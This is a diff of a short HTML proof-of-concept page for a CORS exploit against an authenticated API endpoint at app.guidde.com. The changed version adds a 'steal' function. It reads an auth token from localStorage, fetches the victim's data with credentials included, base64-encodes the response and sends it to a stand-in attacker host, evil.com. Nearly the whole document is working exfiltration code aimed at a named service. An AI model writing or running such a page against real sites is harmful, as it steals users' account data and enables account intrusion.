@@ -1,16 +1,28 @@
 <!DOCTYPE html>
 <html>
-<body>
-<h1>CORS Exploit PoC</h1>
+  <body>
     <script>
-fetch("https://app.guidde.com/c/v1/spaces", {
-    method: "GET",
-    credentials: "include"
-})
-.then(r => r.text())
-.then(d => alert(d))
-.catch(e => alert("Error: " + e));
-</script>
+      async function steal() {
+        try {
+          // Target API endpoint that requires auth
+          let resp = await fetch("https://app.guidde.com/c/v1/spaces", {
+            method: "GET",
+            headers: {
+              "Authorization": localStorage.getItem("authToken") // or sessionStorage
+            },
+            credentials: "include" // in case it still uses cookies too
+          });
 
-</body>
+          let data = await resp.text();
+          
+          // Send stolen data to attacker server
+          await fetch("https://evil.com/log?data=" + btoa(data));
+        } catch(e) {
+          console.log("Exploit failed:", e);
+        }
+      }
+
+      steal();
+    </script>
+  </body>
 </html>
